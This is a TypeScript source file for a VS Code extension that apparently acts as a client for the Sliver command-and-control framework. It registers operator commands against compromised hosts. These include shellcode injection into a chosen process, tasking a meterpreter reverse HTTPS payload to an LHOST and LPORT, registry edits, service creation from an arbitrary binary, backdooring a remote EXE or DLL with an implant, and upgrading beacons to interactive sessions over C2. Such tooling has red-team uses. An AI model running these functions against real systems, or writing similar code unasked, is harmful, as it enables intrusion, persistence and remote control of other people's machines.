import * as vscode from 'vscode';
import { ConnectionManager } from '../client/ConnectionManager';
import { friendlyError, requireActive, showText, resolveSession, Node } from './helpers';

const HIVES = ['HKCU', 'HKLM', 'HKCC', 'HKPD', 'HKU', 'HKCR'];

/** Tiers A/B/C/D/E/G: file ops, exec, quick-wins, session-mode, registry, services, persistence. */
export function registerExtended(connections: ConnectionManager): vscode.Disposable[] {
  const reg = (id: string, fn: (...a: any[]) => any) => vscode.commands.registerCommand(id, fn);
  const active = () => requireActive(connections);
  const sess = (n?: Node) => resolveSession(connections, n);
  const sid = (s: any) => ({ SessionID: s.ID });
  const err = (label: string, e: unknown) => vscode.window.showErrorMessage(`${label}: ${friendlyError(e)}`);

  return [
    // ---------- Filesystem (Tier B) ----------
    reg('sliver.session.chmod', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const path = await vscode.window.showInputBox({ prompt: 'Path' });
      const mode = path && (await vscode.window.showInputBox({ prompt: 'Mode (e.g. 0755)', value: '0755' }));
      if (!path || !mode) return;
      const recursive = (await vscode.window.showQuickPick(['No', 'Yes'], { placeHolder: 'Recursive?' })) === 'Yes';
      try { await c.chmod({ Path: path, FileMode: mode, Recursive: recursive, Request: sid(s) }); void vscode.window.showInformationMessage(`chmod ${mode} ${path}`); }
      catch (e) { void err('chmod', e); }
    }),
    reg('sliver.session.chown', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const path = await vscode.window.showInputBox({ prompt: 'Path' });
      if (!path) return;
      const uid = await vscode.window.showInputBox({ prompt: 'UID', value: '0' });
      if (uid === undefined) return;
      const gid = await vscode.window.showInputBox({ prompt: 'GID', value: '0' });
      if (gid === undefined) return;
      try { await c.chown({ Path: path, Uid: uid, Gid: gid, Recursive: false, Request: sid(s) }); void vscode.window.showInformationMessage(`chown ${uid}:${gid} ${path}`); }
      catch (e) { void err('chown', e); }
    }),
    reg('sliver.session.cp', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const src = await vscode.window.showInputBox({ prompt: 'Source path (remote)' });
      const dst = src && (await vscode.window.showInputBox({ prompt: 'Destination path (remote)' }));
      if (!src || !dst) return;
      try { const r = await c.cp({ Src: src, Dst: dst, Request: sid(s) }); void vscode.window.showInformationMessage(`Copied ${r.BytesWritten ?? '?'} bytes → ${dst}`); }
      catch (e) { void err('cp', e); }
    }),
    reg('sliver.session.grep', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const pattern = await vscode.window.showInputBox({ prompt: 'Search pattern (regex)' });
      const path = pattern && (await vscode.window.showInputBox({ prompt: 'Path to search', value: '/' }));
      if (!pattern || !path) return;
      const recursive = (await vscode.window.showQuickPick(['Yes', 'No'], { placeHolder: 'Recursive?' })) === 'Yes';
      try { const r = await c.grep({ SearchPattern: pattern, Path: path, Recursive: recursive, Request: sid(s) }); await showText(JSON.stringify(r.Results ?? r, null, 2), 'json'); }
      catch (e) { void err('grep', e); }
    }),
    reg('sliver.session.mount', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      try { const r = await c.mount(s.ID); await showText(JSON.stringify(r.Info ?? r, null, 2), 'json'); } catch (e) { void err('mount', e); }
    }),
    reg('sliver.session.memfiles', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      try { const r = await c.memfilesList(s.ID); await showText(JSON.stringify(r.Files ?? r, null, 2), 'json'); } catch (e) { void err('memfiles', e); }
    }),

    // ---------- Execution (Tier G) ----------
    reg('sliver.session.executeShellcode', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const file = await vscode.window.showOpenDialog({ canSelectMany: false, openLabel: 'Shellcode file' });
      if (!file?.length) return;
      const pidStr = await vscode.window.showInputBox({ prompt: 'Target PID (0 = current process)', value: '0' });
      const data = Buffer.from(await vscode.workspace.fs.readFile(file[0]));
      try { await c.task({ Data: data, Pid: Number(pidStr) || 0, RWXPages: true, Encoder: '', Request: { ...sid(s), Timeout: '60' } }); void vscode.window.showInformationMessage('Shellcode injected.'); }
      catch (e) { void err('execute-shellcode', e); }
    }),
    reg('sliver.session.msf', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const payload = await vscode.window.showInputBox({ prompt: 'MSF payload', value: 'meterpreter_reverse_https' });
      const lhost = payload && (await vscode.window.showInputBox({ prompt: 'LHOST' }));
      const lport = lhost && (await vscode.window.showInputBox({ prompt: 'LPORT', value: '4444' }));
      if (!payload || !lhost || !lport) return;
      try { await c.msf({ Payload: payload, LHost: lhost, LPort: Number(lport), Encoder: '', Iterations: 0, Request: sid(s) }); void vscode.window.showInformationMessage('MSF payload tasked.'); }
      catch (e) { void err('msf', e); }
    }),

    // ---------- Quick wins (Tier A) ----------
    reg('sliver.session.unsetenv', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const name = await vscode.window.showInputBox({ prompt: 'Env variable to unset' });
      if (!name) return;
      try { await c.unsetEnv({ Name: name, Request: sid(s) }); void vscode.window.showInformationMessage(`Unset ${name}`); } catch (e) { void err('unsetenv', e); }
    }),
    reg('sliver.session.currentToken', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      try { const r = await c.currentTokenOwner(s.ID); void vscode.window.showInformationMessage(`Current token: ${r.Output ?? JSON.stringify(r)}`); } catch (e) { void err('token-owner', e); }
    }),

    // ---------- Session <-> beacon mode (Tier C) ----------
    reg('sliver.beacon.interactive', async (n?: Node) => {
      const c = active(); if (!c || !n?.beacon) return;
      // Beacon task → must be async; the new session connects back via the beacon's active C2.
      try {
        await c.openSession({
          Delay: '0',
          C2s: n.beacon.ActiveC2 ? [n.beacon.ActiveC2] : [],
          Request: { BeaconID: n.beacon.ID, Async: true },
        });
        void vscode.window.showInformationMessage('Interactive session requested; it will appear in Sessions on the next beacon check-in.');
      } catch (e) { void err('interactive', e); }
    }),
    reg('sliver.session.background', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      try { await c.closeSession(s.ID); void vscode.window.showInformationMessage('Session closed (implant continues as beacon if applicable).'); void vscode.commands.executeCommand('sliver.refresh'); }
      catch (e) { void err('background', e); }
    }),

    // ---------- Registry (Tier E) ----------
    reg('sliver.session.registryWrite', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const hive = await vscode.window.showQuickPick(HIVES, { placeHolder: 'Hive' });
      if (!hive) return;
      const path = await vscode.window.showInputBox({ prompt: 'Key path' });
      if (!path) return;
      const key = await vscode.window.showInputBox({ prompt: 'Value name (blank = default)' });
      if (key === undefined) return;
      const val = await vscode.window.showInputBox({ prompt: 'String value' });
      if (val === undefined) return;
      try { await c.registryWrite({ Hive: hive, Path: path, Key: key, StringValue: val, Type: 1, Hostname: '', Request: sid(s) }); void vscode.window.showInformationMessage('Registry value written.'); }
      catch (e) { void err('registry-write', e); }
    }),
    reg('sliver.session.registryCreateKey', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const hive = await vscode.window.showQuickPick(HIVES, { placeHolder: 'Hive' });
      const path = hive && (await vscode.window.showInputBox({ prompt: 'Key path' }));
      const key = path && (await vscode.window.showInputBox({ prompt: 'New subkey name' }));
      if (!hive || !path || !key) return;
      try { await c.registryCreateKey({ Hive: hive, Path: path, Key: key, Hostname: '', Request: sid(s) }); void vscode.window.showInformationMessage('Registry key created.'); }
      catch (e) { void err('registry-create-key', e); }
    }),
    reg('sliver.session.registryDeleteKey', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const hive = await vscode.window.showQuickPick(HIVES, { placeHolder: 'Hive' });
      const path = hive && (await vscode.window.showInputBox({ prompt: 'Key path' }));
      const key = path && (await vscode.window.showInputBox({ prompt: 'Subkey to delete' }));
      if (!hive || !path || !key) return;
      try { await c.registryDeleteKey({ Hive: hive, Path: path, Key: key, Hostname: '', Request: sid(s) }); void vscode.window.showInformationMessage('Registry key deleted.'); }
      catch (e) { void err('registry-delete-key', e); }
    }),
    reg('sliver.session.registryList', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const hive = await vscode.window.showQuickPick(HIVES, { placeHolder: 'Hive' });
      const path = hive && (await vscode.window.showInputBox({ prompt: 'Key path' }));
      if (!hive || !path) return;
      try {
        const subs = await c.registryListSubKeys({ Hive: hive, Path: path, Hostname: '', Request: sid(s) });
        const vals = await c.registryListValues({ Hive: hive, Path: path, Hostname: '', Request: sid(s) });
        await showText(`# ${hive}\\${path}\n\n## Subkeys\n${JSON.stringify(subs.Subkeys ?? subs, null, 2)}\n\n## Values\n${JSON.stringify(vals.ValueNames ?? vals, null, 2)}`);
      } catch (e) { void err('registry-list', e); }
    }),

    // ---------- Services (Tier D) ----------
    reg('sliver.session.serviceStart', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const name = await vscode.window.showInputBox({ prompt: 'Service name' });
      const bin = name && (await vscode.window.showInputBox({ prompt: 'Binary path' }));
      if (!name || !bin) return;
      try { await c.startService({ ServiceName: name, BinPath: bin, ServiceDescription: name, Arguments: '', Hostname: '', Request: sid(s) }); void vscode.window.showInformationMessage(`Service ${name} created/started.`); }
      catch (e) { void err('service-start', e); }
    }),
    reg('sliver.session.serviceStop', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const name = await vscode.window.showInputBox({ prompt: 'Service name to stop' });
      if (!name) return;
      try { await c.stopService({ ServiceInfo: { ServiceName: name, Hostname: '' }, Request: sid(s) }); void vscode.window.showInformationMessage(`Service ${name} stopped.`); }
      catch (e) { void err('service-stop', e); }
    }),
    reg('sliver.session.serviceRemove', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const name = await vscode.window.showInputBox({ prompt: 'Service name to remove' });
      if (!name) return;
      try { await c.removeService({ ServiceInfo: { ServiceName: name, Hostname: '' }, Request: sid(s) }); void vscode.window.showInformationMessage(`Service ${name} removed.`); }
      catch (e) { void err('service-remove', e); }
    }),
    reg('sliver.session.serviceDetail', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const name = await vscode.window.showInputBox({ prompt: 'Service name' });
      if (!name) return;
      try { const r = await c.serviceDetail({ ServiceInfo: { ServiceName: name, Hostname: '' }, Request: sid(s) }); await showText(JSON.stringify(r.Detail ?? r, null, 2), 'json'); }
      catch (e) { void err('service-detail', e); }
    }),

    // ---------- Persistence (Tier A) ----------
    reg('sliver.session.backdoor', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      const path = await vscode.window.showInputBox({ prompt: 'Remote EXE/DLL path to backdoor' });
      const profile = path && (await vscode.window.showInputBox({ prompt: 'Implant profile name to embed' }));
      if (!path || !profile) return;
      try { await c.backdoor({ FilePath: path, ProfileName: profile, Request: sid(s) }); void vscode.window.showInformationMessage('Backdoor applied.'); }
      catch (e) { void err('backdoor', e); }
    }),

    // ---------- Beacon task cancel (Tier A) ----------
    reg('sliver.beacon.cancelTask', async (n?: Node) => {
      const c = active(); if (!c || !n?.beacon) return;
      const { Tasks } = await c.getBeaconTasks(n.beacon.ID);
      const pending = Tasks.filter((t: any) => t.State === 'pending' || t.State === 'sent');
      const pick = await vscode.window.showQuickPick(
        (pending.length ? pending : Tasks).map((t: any) => ({ label: t.Description, description: `${t.State} ${t.ID.slice(0, 8)}`, id: t.ID })),
        { placeHolder: 'Task to cancel' },
      );
      if (!pick) return;
      try { await c.cancelBeaconTask(pick.id); void vscode.window.showInformationMessage('Task cancelled.'); }
      catch (e) { void err('cancel-task', e); }
    }),

    // ---------- Wasm extensions (advanced) ----------
    reg('sliver.session.wasmExtensions', async (n?: Node) => {
      const c = active(); const s = c && (await sess(n)); if (!c || !s) return;
      try { const r = await c.listWasmExtensions(s.ID); await showText(JSON.stringify(r.Names ?? r, null, 2), 'json'); }
      catch (e) { void err('wasm-extensions', e); }
    }),
  ];
}
